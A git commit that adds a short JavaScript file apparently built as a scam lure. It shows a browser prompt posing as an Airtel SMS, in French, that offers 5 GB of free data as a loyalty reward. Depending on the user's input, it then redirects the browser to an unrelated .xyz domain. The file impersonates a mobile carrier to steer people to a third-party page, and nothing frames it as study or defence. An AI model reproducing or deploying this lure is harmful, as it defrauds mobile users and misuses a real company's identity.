793ee944a1ab2f655558888e2650dc18801054f9
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-10 22:56:58 -0700

    Create chadairtel-activation.js

---
+++ chadairtel-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('AIRTEL SMS: Cher client, veuillez vérifier si votre carte SIM AIRTEL est éligible pour recevoir 5 Go de données illimitées, récompense pour les anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/chadairtel.html';
+}
